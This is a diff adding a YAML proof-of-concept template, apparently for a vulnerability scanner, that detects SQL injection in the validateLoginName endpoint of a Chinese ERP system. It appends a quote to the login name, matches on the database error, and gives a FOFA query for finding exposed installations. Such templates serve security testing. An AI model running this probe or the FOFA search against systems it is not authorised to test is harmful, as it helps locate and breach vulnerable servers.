@@ -1,0 +1,20 @@
+id: poc-yaml-yun-shi-kong-erp-system-validateloginname-sqli
+info:
+  name: 云时空社会化商业ERP系统 validateLoginName SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 云时空社会化商业ERP系统
+  fofa: app="云时空社会化商业ERP系统"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /sys/user/validateLoginName?loginName=admin
+  expression: status_code == 200 && body == "false"
+- method: GET
+  path: /sys/user/validateLoginName?loginName=admin'
+  expression: status_code == 500 && contains(body,"java.sql.SQLException") && contains(body,"SQL
+    命令未正确结束")
+transport: http
